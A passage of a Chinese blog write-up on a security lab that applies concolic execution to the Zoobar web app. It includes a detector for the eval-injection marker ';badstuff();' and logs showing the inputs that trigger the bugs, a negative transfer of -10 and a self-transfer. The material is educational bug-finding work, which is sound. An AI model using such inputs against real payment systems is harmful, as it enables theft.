<code>primary_key()</code> 皆为 <code>concolic</code> 类型变量，而我们已经完成了 <code>concolic_int</code> 与 <code>concolic_str</code> 的 <code>__cmp__</code> 运算符重载，因此在重写的 get 函数中直接使用 <code>==</code> 进行对比即可</p><p>需要注意的是，虽然我们知道 <code>Test1</code> 的主键为 <code>name</code>，但这里相比起直接使用 <code>row.name</code>，我们需要且应当写一个<strong>更为通用的方法</strong>，在注释中提示我们可以使用 <code>r.__table__.primary_key.columns.keys()[0]</code> 获取主键名的字符串，因此我们可以使用 Python 的内置方法 <code>getattr()</code> 来获取主键的值，因此最后的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  rows = query.<span class="hljs-built_in">all</span>()<br><br>  <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> query.<span class="hljs-built_in">all</span>():<br>    primary_key_in_row = <span class="hljs-built_in">getattr</span>(r, r.__table__.primary_key.columns.keys()[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> primary_key_in_row == primary_key:<br>      <span class="hljs-keyword">return</span> r<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 8：</p><p><img src="https://s2.loli.net/2022/12/21/wIzaOhY4bJxsNgq.png" alt="image.png"></p><blockquote><p>注意这里需要<strong>额外通过 Exercise 9 的第一项才表示做对了</strong>，因为后面需要借助这里的符号执行代码演示一些东西</p></blockquote><p>现在我们可以开始对 Zoobar 应用我们的混合执行框架了，我们首先尝试运行 <code>./check-symex-zoobar.py</code>，在其中有着对 Zoobar 使用符号输入的相关逻辑，且为了让混合执行能够快速结束，其过度约束了给予 Zoobar 的输入，此外所有的 HTTP 请求方法（于 <code>environ[&#39;REQUEST_METHOD&#39;]</code> 中）皆为 <code>GET</code>，且请求的所有 UQL（于 <code>environ[&#39;PATH_INFO&#39;]</code> 中）皆以 <code>trans</code> 起始</p><p>相较于直接运行，Lab 更推荐使用 <code>script</code> 来运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>之后屏幕上会持续打出一堆信息：</p><p><img src="https://s2.loli.net/2022/12/21/D79tqYuBGXFHPjd.png" alt="image.png"></p><p>大概十几秒后结束，迭代的数量表示不同的路径：</p><p><img src="https://s2.loli.net/2022/12/21/UHD4s6MIq9pRCBc.png" alt="image.png"></p><blockquote><p>和实验手册中不同的是笔者这里有 <code>142 iterations</code>，但在实验手册里是 <code>139</code>，这里暂且先不管（</p></blockquote><p>由于 Zoobar 由 Python 编写，故不会有内存损坏这一类的漏洞（这句话是实验手册说的，但是<a href="https://www.cvedetails.com/cve/CVE-2021-3177/"> CVE-2021-3177</a>和一众其他 CVE 表示：怎么会是呢？），因此我们没法立刻辨明在这一百多路径中是否存在问题，因此我们需要借助一些显式的不变量（invariant）来捕捉表示安全问题的情况</p><p>Lab 已经实现了的一个不变量便是 eval injection——即对 <code>eval()</code> 的参数进行注入，在 <code>symex/symeval.py</code> 中 Lab 给出了对这种情况的检查思路：若传给 <code>eval()</code> 的字符串可以包含  <code>;badstuff();</code> ，说明我们发现了一个 eval injection 漏洞——由此我们可以让混合执行系统去尝试构建能包含该子串的字符串</p><p>我们可以使用如下命令查看 Zoobar 中是否存在 eval injection 漏洞：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py | grep <span class="hljs-string">&quot;Exception: eval injection&quot;</span></span><br></code></pre></td></tr></table></figure><p>结果如下，发现了两个 eval injection：</p><p><img src="https://s2.loli.net/2022/12/21/YslcqeuVP2C6Ni7.png" alt="image.png"></p><p>现在我们来看  <code>symex/symeval.py</code>  的内部逻辑，其逻辑比较简单，主要就是给内置的 <code>eval()</code> 套了一层 wrapper，检查参数是否带有  <code>;badstuff();</code> 字符串，若是则直接抛异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">real_eval = builtins.<span class="hljs-built_in">eval</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myeval</span>(<span class="hljs-params">expr, <span class="hljs-built_in">globals</span> = <span class="hljs-literal">None</span>, <span class="hljs-built_in">locals</span> = <span class="hljs-literal">None</span></span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;;badstuff();&#x27;</span> <span class="hljs-keyword">in</span> expr:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;eval injection&quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">locals</span> = <span class="hljs-built_in">globals</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    frame = inspect.currentframe()<br>    <span class="hljs-keyword">try</span>:<br>      <span class="hljs-built_in">locals</span> = frame.f_back.f_locals<br>      <span class="hljs-built_in">globals</span> = frame.f_back.f_globals<br>    <span class="hljs-keyword">finally</span>:<br>      <span class="hljs-keyword">del</span> frame<br><br>  <span class="hljs-comment">## Try to evaluate the expression as an integer</span><br>  v = str_to_small_int(expr)<br>  <span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> v<br><br>  <span class="hljs-keyword">return</span> real_eval(expr, <span class="hljs-built_in">globals</span>, <span class="hljs-built_in">locals</span>)<br>builtins.<span class="hljs-built_in">eval</span> = myeval<br></code></pre></td></tr></table></figure><p>而在 <code>check-symex-zoobar.py</code> 当中，应用了混合执行框架的为 <code>test_stuff()</code> 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">fuzzy.concolic_execs(test_stuff, maxiter=<span class="hljs-number">500</span>, verbose=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>这里我们暂且先不关注 Zoobar 的实现为何，我们主要关注如何使用我们的混合执行系统来寻找其中的漏洞，在 <code>test_stuff()</code> 中实际上是通过将部分参数设置为混合值来进行混合执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  <span class="hljs-comment"># Zoobar初始化工作</span><br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  <span class="hljs-comment">##...</span><br><br>  <span class="hljs-comment">## 设置环境变量</span><br>  environ = &#123;&#125;<br>  <span class="hljs-comment">##...</span><br>  environ[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;referrer&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>  environ[<span class="hljs-string">&#x27;HTTP_COOKIE&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;cookie&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>接下来我们需要实现两种额外的不变量检查以检查 Zoobar 是否存在其他漏洞：</p><ul><li>若没有新用户被注册，则所有用户的 Zoobar balances 之和应当在每次请求间保持一致</li><li>若用户 <code>u</code> 没有向 Zoobar 进行请求，<code>u</code> 的 Zoobar balance 不应当缩小</li></ul><p>于是来到 Exercise 9，向  <code>check-symex-zoobar.py</code> 中添加相应的不变量检查：</p><blockquote><p><strong>Exercise 9.</strong> Add invariant checks to <code>check-symex-zoobar.py</code> to implement the above two rules (total balance preservation and no zoobar theft). Look for the comment <code>Exercise 9: your code here</code> to see where you should write this code. When you detect a zoobar balance mismatch, call the <code>report_balance_mismatch()</code> function. When you detect zoobar theft, call <code>report_zoobar_theft()</code>.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to re-run <strong>.&#x2F;check-symex-zoobar.py</strong> and see whether the output contains the messages <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you (run <code>check-symex-zoobar.py</code> and look for these magic strings).</p></blockquote><p>在 Zoobar 中实际上是通过 <code>zoobar.app()</code> 来完成 HTTP 请求的解析实现，因此在  <code>test_stuff()</code>  中选择直接构造请求（<code>environ</code> 字典）传递给该函数来模拟向 Zoobar 发送 HTTP 请求的过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">environ = &#123;&#125;<br><span class="hljs-comment">##...</span><br>environ[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] = <span class="hljs-string">&#x27;GET&#x27;</span><br>environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>] = <span class="hljs-string">&#x27;trans&#x27;</span> + fuzzy.mk_str(<span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">if</span> environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].startswith(<span class="hljs-string">&#x27;//&#x27;</span>):<br>  <span class="hljs-comment">## Don&#x27;t bother trying to construct paths with lots of slashes;</span><br>  <span class="hljs-comment">## otherwise, the lstrip() code generates lots of paths..</span><br>  <span class="hljs-keyword">return</span><br><br>resp = zoobar.app(environ, startresp)<br><span class="hljs-keyword">if</span> verbose:<br>  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> resp:<br>    <span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>我们对代码的检查则是在请求完成后进行的，首先是对 balance 的检查，这里不了解 Zoobar 的相关结构（或者没来得及<del>&#x2F;懒得</del>看）也不要紧，在 <code>test_stuff()</code> 的开头有这样的计算 balances 总和的逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  <span class="hljs-comment"># 计算 balance 总和</span><br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br></code></pre></td></tr></table></figure><p>对于单个用户而言我们可以使用 <code>person.zoobars</code> 获取其 balance，而我们可以通过 <code>pdb.query(zoobar.zoodb.Person).all()</code> 获取用户对象列表 ，那么我们只需要在请求结束后使用同样的逻辑计算当前的 balance，并与原 balance 对比即可，若不一致则按手册说明调用 <code>report_balance_mismatch()</code> 即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 9: your code here.</span><br><br><span class="hljs-comment">## Detect balance mismatch.</span><br><span class="hljs-comment">## When detected, call report_balance_mismatch()</span><br>balance2 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br><span class="hljs-keyword">if</span> balance1 != balance2:<br>  report_balance_mismatch()<br></code></pre></td></tr></table></figure><p>然后是第二个问题，我们需要找到没有进行操作但是 balance 缩小了的用户（即发生转出），由于在测试函数中仅进行了一次操作，故未进行操作的用户的 balance <strong>不应当小于初始值</strong>（但是可以大于，因为可以有别的账户向其进行转入），因此我们需要知道一个用户的初始信息</p><p>在 <code>test_stuff()</code> 开头便对应创建了两个数据库，因此我们可以从其定义入手：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br>  pdb.commit()<br><br>  tdb = zoobar.zoodb.transfer_setup()<br>  tdb.query(zoobar.zoodb.Transfer).delete()<br>  tdb.commit()<br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>在 <code>zoobar/zoodb.py</code> 中定义了 Person 数据库，其中 balance（也就是 zoobars 字段）的初始值为 10，同时主键为 <code>username</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">PersonBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;person&quot;</span><br>    username = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    password = Column(String(<span class="hljs-number">128</span>))<br>    token = Column(String(<span class="hljs-number">128</span>))<br>    zoobars = Column(Integer, nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-number">10</span>)<br>    profile = Column(String(<span class="hljs-number">5000</span>), nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>在该文件中还定义了 Transfer 数据库，应当用以表示单次交易的双方及数值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transfer</span>(<span class="hljs-title class_ inherited__">TransferBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;transfer&quot;</span><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)<br>    sender = Column(String(<span class="hljs-number">128</span>))<br>    recipient = Column(String(<span class="hljs-number">128</span>))<br>    amount = Column(Integer)<br>    time = Column(String)<br></code></pre></td></tr></table></figure><p>那么我们不难想到的是，我们可以遍历 Person 数据库以获得所有用户的用户名集合，接下来遍历 Transfer 数据库来将用户名集合中的非 sender 给剔除（因为我们主要关注 recipient 发生了 balance 缩小的情况），最后检查剩余用户是否存在 balance 小于初始值的情况，若是则说明存在漏洞：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Detect zoobar theft.</span><br><span class="hljs-comment">## When detected, call report_zoobar_theft()</span><br>udict = &#123;&#125;<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>():<br>  udict[p.username] = p<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tdb.query(zoobar.zoodb.Transfer).<span class="hljs-built_in">all</span>():<br>  udict.pop(t.sender)<br><span class="hljs-keyword">for</span> username <span class="hljs-keyword">in</span> udict.keys():<br>  <span class="hljs-keyword">if</span> udict[username].zoobars &lt; <span class="hljs-number">10</span>:<br>    report_zoobar_theft()<br></code></pre></td></tr></table></figure><p>成功通过 Exercise 9：</p><p><img src="https://s2.loli.net/2022/12/24/FnSvPHRsQbc6LZT.png" alt="image.png"></p><p>最后是 Exercise 10，修复 balance mismatch 和 zoobar theft 这两个漏洞（Lab 已经替我们修好了 eval injection 的漏洞），需要注意的是这里评测系统要求将存在问题的源码文件拷贝到 <code>zoobar-fixed</code> 下再进行修复，：</p><blockquote><p><strong>Exercise 10.</strong> Fix the two bugs you found in Exercise 9, by copying whatever <code>.py</code> files you need to modify from the <code>zoobar</code> directory to <code>zoobar-fixed</code> and changing them there.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to run <strong>.&#x2F;check-symex-zoobar-fixed.sh</strong> and see whether the output still contains the messages <code>Exception: eval injection</code>, <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you.</p></blockquote><p>那么我们首先要找到漏洞出现的位置，笔者最初的思路是在两个找到漏洞的 report 函数进行约束求解就可以获得造成问题的输入，但是<strong>这个做法并不可行，因为本 Lab 提供的混合执行框架是高度封装好的</strong>，在 <code>concolic_execs()</code> 的执行过程中我们是没办法中途停下来进行约束求解的</p><blockquote><p>笔者思考了半天怎么改才能在 <code>test_stuff()</code> 的两个 report() 函数进行约束求解来得到触发漏洞的输入，后面发现基本没啥可行性，实在要弄的话需要对整个框架进行大改，故就此作罢改换思路…</p></blockquote><p>我们重新思考一个问题：  <em>Lab 3 为什么提供的是混合执行框架而非纯符号执行或是纯具体执行呢？</em>  </p><p>正如前文所言，concolic execution 的诞生便是为了解决 symbolic execution 与 concrete execution 所分别存在的问题，融合两者的特性来达到一个更好的效果</p><p>现在让我们重新审视 <code>concolic_execs()</code> 的执行流程：</p><ul><li>由一个外层大循环不断迭代<ul><li>从输入队列中取出具体值字典</li><li>调用 <code>concolic_exec_input()</code> 执行目标函数，获取到返回值、分支条件列表、分支调用方列表</li><li>将得到的新的返回值添加至 <code>outs</code> 集合</li><li>内层小循环遍历分支条件列表<ul><li>调用 <code>concolic_force_branch()</code> 获取将当前分支条件逆转后的约束条件</li><li>若该约束不在 <code>checked</code> （已验证约束集合）中，添加，并调用 <code>concolic_find_input()</code> 进行约束求解</li><li>约束可解，将结果添加到下一次作为输入的具体值字典中</li></ul></li></ul></li></ul><p>我们不难得知的是，当 <code>test_stuff()</code> 报告漏洞时，<strong>说明我们的 concolic execution system 给出了一个能够触发漏洞的 concrete input</strong></p><p>我们可以使用如下语句来将输出重定向至当前目录下的 <code>typescript</code> 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>前面我们用到的两个 report() 函数实际上就只是 <code>print()</code> 而已，我们只需要在输出结果中搜索对应的字符串即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_balance_mismatch</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Balance mismatch detected&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_zoobar_theft</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Zoobar theft detected&quot;</span>)<br></code></pre></td></tr></table></figure><p>以下是两个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;-10&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1689</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css...</span><br><span class="hljs-string"># response，比较长且无意义，这里暂且省略</span><br><span class="hljs-string">WARNING: Balance mismatch detected</span><br><span class="hljs-string">Trying concrete value: &#123;&#x27;</span>form_recipient_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_val<span class="hljs-string">&#x27;: &#x27;</span>-<span class="hljs-number">10</span><span class="hljs-string">&#x27;, &#x27;</span>rsplit_split_cookie_=_r_<span class="hljs-comment">#_r&#x27;: &#x27;atok&#x27;, &#x27;rsplit_split_cookie_=_r_#_l&#x27;: &#x27;alice&#x27;, &#x27;split_cookie_=_r&#x27;: &#x27;alice#atok&#x27;, &#x27;split_cookie_=_l&#x27;: &#x27;PyZoobarLogin&#x27;, &#x27;cookie&#x27;: &#x27;PyZoobarLogin=alice#atok&#x27;, &#x27;path&#x27;: &#x27;fer&#x27;, &#x27;form_recipient_val&#x27;: &#x27;bob&#x27;, &#x27;referrer&#x27;: &#x27;&#x27;&#125;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1686</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;tex...</span><br><span class="hljs-string"># response，比较长且无意义，这里暂且省略</span><br><span class="hljs-string">WARNING: Zoobar theft detected</span><br></code></pre></td></tr></table></figure><p>参数的含义不难辨认，<code>form_zoobars_val</code> 为单次 transfer 的数值，<code>cookie</code> 表示发送方用户名及 cookie，<code>form_recipient_val</code> 表示接收方用户名，那么这里我们可以推断出至少可能存在两个漏洞：</p><ul><li>未对负数的 transfer 进行过滤，导致一个用户可以盗取另一用户的 balance</li><li>未对 self-transfer 的情况做合适处理，导致最后总的 balance 不一致</li></ul><p>但这个时候我们只知道  <em>漏洞是存在的</em>  ，而不知道  <em>漏洞在何处</em>  ，那这里我们需要再审一审日志别的地方，我们不难发现会有一些抛异常的日志：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/transfer.py&quot;</span>, line <span class="hljs-number">16</span>, <span class="hljs-keyword">in</span> transfer<br>    bank.transfer(g.user.person.username,<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/bank.py&quot;</span>, line <span class="hljs-number">12</span>, <span class="hljs-keyword">in</span> transfer<br>    recipient_balance = recipientp.zoobars + 